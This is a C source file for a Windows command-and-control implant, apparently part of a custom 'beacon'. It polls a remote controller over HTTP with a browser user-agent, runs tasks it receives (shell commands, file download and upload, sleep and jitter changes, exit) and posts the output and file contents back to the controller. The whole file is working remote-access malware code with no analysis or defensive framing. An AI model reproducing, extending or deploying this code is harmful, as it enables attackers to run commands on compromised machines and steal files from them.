#include <beacon.h>
#include <stdio.h>
#include <string.h>

/* ── minimal JSON field extractors ─────────────────────── */

static BOOL json_str(const char *start, const char *end, const char *key,
                     char *buf, int buf_sz) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = start;
    while (p < end) {
        const char *found = strstr(p, needle);
        if (!found || found >= end) break;
        p = found + strlen(needle);
        while (p < end && (*p == ' ' || *p == '\t')) p++;
        if (*p != '"') continue;
        p++;
        int i = 0;
        while (p < end && *p != '"' && i < buf_sz - 1) {
            if (*p == '\\' && (p + 1) < end) {
                p++;
                switch (*p) {
                case 'n':  buf[i++] = '\n'; break;
                case 'r':  buf[i++] = '\r'; break;
                case 't':  buf[i++] = '\t'; break;
                default:   buf[i++] = *p;   break;
                }
            } else {
                buf[i++] = *p;
            }
            p++;
        }
        buf[i] = '\0';
        return TRUE;
    }
    buf[0] = '\0';
    return FALSE;
}

/* Heap-allocates and returns the raw (unescaped) string value for key. */
static char *json_str_heap(const char *start, const char *end,
                            const char *key, int *out_len) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = start;
    while (p < end) {
        const char *found = strstr(p, needle);
        if (!found || found >= end) break;
        p = found + strlen(needle);
        while (p < end && (*p == ' ' || *p == '\t')) p++;
        if (*p != '"') continue;
        p++;
        const char *vs = p;
        while (p < end && *p != '"') {
            if (*p == '\\' && (p + 1) < end) p++;
            p++;
        }
        int len = (int)(p - vs);
        char *buf = (char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)(len + 1));
        if (!buf) return NULL;
        memcpy(buf, vs, (size_t)len);
        buf[len] = '\0';
        if (out_len) *out_len = len;
        return buf;
    }
    return NULL;
}

/* ── HTTP helpers ───────────────────────────────────────── */
static char *http_get_body(BEACON_CTX *ctx, const wchar_t *path, DWORD *out_len) {
    *out_len = 0;
    HINTERNET hSess = WinHttpOpen(L"Mozilla/5.0",
                                  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME,
                                  WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return NULL;
    HINTERNET hConn = WinHttpConnect(hSess, ctx->host, ctx->port, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return NULL; }
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path, NULL,
                                        WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return NULL; }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        return NULL;
    }

    DWORD cap = 64 * 1024;
    char *body = (char *)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!body) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        return NULL;
    }
    DWORD total = 0, avail = 0, bread = 0;
    do {
        avail = 0;
        if (!WinHttpQueryDataAvailable(hReq, &avail) || avail == 0) break;
        while (total + avail + 1 > cap) {
            cap *= 2;
            char *tmp = (char *)HeapReAlloc(GetProcessHeap(), 0, body, cap);
            if (!tmp) { HeapFree(GetProcessHeap(), 0, body); body = NULL; goto done; }
            body = tmp;
        }
        WinHttpReadData(hReq, body + total, avail, &bread);
        total += bread;
    } while (avail > 0);
    if (body) { body[total] = '\0'; *out_len = total; }
done:
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
    return body;
}

static void http_post_json(BEACON_CTX *ctx, const wchar_t *path,
                           const char *json, DWORD json_len) {
    HINTERNET hSess = WinHttpOpen(L"Mozilla/5.0",
                                  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME,
                                  WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return;
    HINTERNET hConn = WinHttpConnect(hSess, ctx->host, ctx->port, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return; }
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", path, NULL,
                                        WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return; }

    WinHttpSendRequest(hReq,
                       L"Content-Type: application/json\r\n", (DWORD)-1L,
                       (LPVOID)json, json_len, json_len, 0);
    WinHttpReceiveResponse(hReq, NULL);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
}

/* ── JSON-escape output ─────────────────────────────────── */
static int json_escape(const char *src, DWORD src_len, char *dst, int dst_sz) {
    int i = 0;
    for (DWORD k = 0; k < src_len && i < dst_sz - 2; k++) {
        unsigned char c = (unsigned char)src[k];
        if      (c == '"')  { dst[i++] = '\\'; dst[i++] = '"';  }
        else if (c == '\\') { dst[i++] = '\\'; dst[i++] = '\\'; }
        else if (c == '\n') { dst[i++] = '\\'; dst[i++] = 'n';  }
        else if (c == '\r') { dst[i++] = '\\'; dst[i++] = 'r';  }
        else if (c == '\t') { dst[i++] = '\\'; dst[i++] = 't';  }
        else if (c < 0x20)  { /* skip */                         }
        else                { dst[i++] = (char)c;                }
    }
    dst[i] = '\0';
    return i;
}

/* ── result submission ──────────────────────────────────── */
void beacon_submit_result(BEACON_CTX *ctx, TASK_RESULT *result) {
    const char *out    = (result->output && result->output_len) ? result->output : "";
    DWORD       out_ln = (result->output && result->output_len) ? result->output_len : 0;

    /* base64 output (download) needs no escaping; shell output does */
    int esc_cap = (int)(out_ln * 2 + 16);
    char *esc_out = (char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)esc_cap);
    if (!esc_out) return;
    json_escape(out, out_ln, esc_out, esc_cap);

    char esc_err[1024];
    json_escape(result->error, (DWORD)strlen(result->error), esc_err, sizeof(esc_err));

    int body_cap = esc_cap + 256;
    char *body = (char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)body_cap);
    if (!body) { HeapFree(GetProcessHeap(), 0, esc_out); return; }

    int body_len = snprintf(body, (size_t)body_cap,
        "{\"task_id\":\"%s\",\"beacon_id\":%lu,\"output\":\"%s\",\"error\":\"%s\"}",
        result->task_id, (unsigned long)ctx->beacon_id, esc_out, esc_err);

    if (body_len > 0)
        http_post_json(ctx, L"/result", body, (DWORD)body_len);

    HeapFree(GetProcessHeap(), 0, body);
    HeapFree(GetProcessHeap(), 0, esc_out);
}

/* ── task poll and dispatch ─────────────────────────────── */
void beacon_poll_tasks(BEACON_CTX *ctx) {
    wchar_t path[64];
    _snwprintf(path, 64, L"/tasks/%lu", (unsigned long)ctx->beacon_id);

    DWORD body_len = 0;
    char *body = http_get_body(ctx, path, &body_len);
    if (!body || body_len < 2) {
        if (body) HeapFree(GetProcessHeap(), 0, body);
        return;
    }

    const char *p   = body;
    const char *end = body + body_len;

    while (p < end) {
        const char *obj_start = strchr(p, '{');
        if (!obj_start || obj_start >= end) break;

        const char *obj_end = obj_start + 1;
        int depth = 1;
        while (obj_end < end && depth > 0) {
            if      (*obj_end == '{') depth++;
            else if (*obj_end == '}') depth--;
            obj_end++;
        }
        if (depth != 0) break;

        /* parse task fields */
        PARSED_TASK task;
        memset(&task, 0, sizeof(task));
        json_str(obj_start, obj_end, "task_id", task.task_id, sizeof(task.task_id));
        json_str(obj_start, obj_end, "type",    task.type,    sizeof(task.type));

        if (task.task_id[0] == '\0') { p = obj_end; continue; }

        if (strcmp(task.type, TASK_TYPE_SHELL) == 0 ||
            strcmp(task.type, TASK_TYPE_DOWNLOAD) == 0) {
            json_str(obj_start, obj_end, "args", task.args, sizeof(task.args));
        } else if (strcmp(task.type, TASK_TYPE_SLEEP) == 0) {
            json_str(obj_start, obj_end, "args", task.args, sizeof(task.args));
        } else if (strcmp(task.type, TASK_TYPE_UPLOAD) == 0) {
            json_str(obj_start, obj_end, "args", task.args, sizeof(task.args));
            task.data = json_str_heap(obj_start, obj_end, "data", &task.data_len);
        }

        /* allocate result */
        TASK_RESULT *result = (TASK_RESULT *)HeapAlloc(GetProcessHeap(),
                                                        HEAP_ZERO_MEMORY,
                                                        sizeof(TASK_RESULT));
        if (!result) { p = obj_end; continue; }
        memcpy(result->task_id, task.task_id, sizeof(result->task_id) - 1);

        DWORD out_cap = (strcmp(task.type, TASK_TYPE_DOWNLOAD) == 0)
                        ? FILE_OUT_CAP : SHELL_OUT_CAP;
        result->output     = (char *)HeapAlloc(GetProcessHeap(), 0, out_cap);
        result->output_cap = out_cap;
        result->output_len = 0;
        if (result->output) result->output[0] = '\0';

        /* dispatch */
        BOOL should_exit = FALSE;

        if (strcmp(task.type, TASK_TYPE_SHELL) == 0) {
            beacon_exec_shell(ctx, &task, result);
        } else if (strcmp(task.type, TASK_TYPE_DOWNLOAD) == 0) {
            beacon_exec_download(&task, result);
        } else if (strcmp(task.type, TASK_TYPE_UPLOAD) == 0) {
            beacon_exec_upload(&task, result);
        } else if (strcmp(task.type, TASK_TYPE_SLEEP) == 0) {
            unsigned long ms = ctx->sleep_ms, jitter = ctx->jitter_pct;
            if (task.args[0]) sscanf(task.args, "%lu %lu", &ms, &jitter);
            ctx->sleep_ms   = (DWORD)ms;
            ctx->jitter_pct = (DWORD)jitter;
            if (result->output) {
                result->output_len = (DWORD)snprintf(result->output, result->output_cap,
                    "sleep \xe2\x86\x92 %lums  jitter \xe2\x86\x92 %lu%%", ms, jitter);
            }
        } else if (strcmp(task.type, TASK_TYPE_EXIT) == 0) {
            if (result->output) {
                result->output_len = (DWORD)snprintf(result->output, result->output_cap,
                    "beacon exiting");
            }
            should_exit = TRUE;
        } else {
            snprintf(result->error, sizeof(result->error),
                     "unknown task type: %s", task.type);
        }

        beacon_submit_result(ctx, result);

        if (result->output) HeapFree(GetProcessHeap(), 0, result->output);
        HeapFree(GetProcessHeap(), 0, result);
        if (task.data)      HeapFree(GetProcessHeap(), 0, task.data);

        if (should_exit) ExitProcess(0);
        p = obj_end;
    }

    HeapFree(GetProcessHeap(), 0, body);
}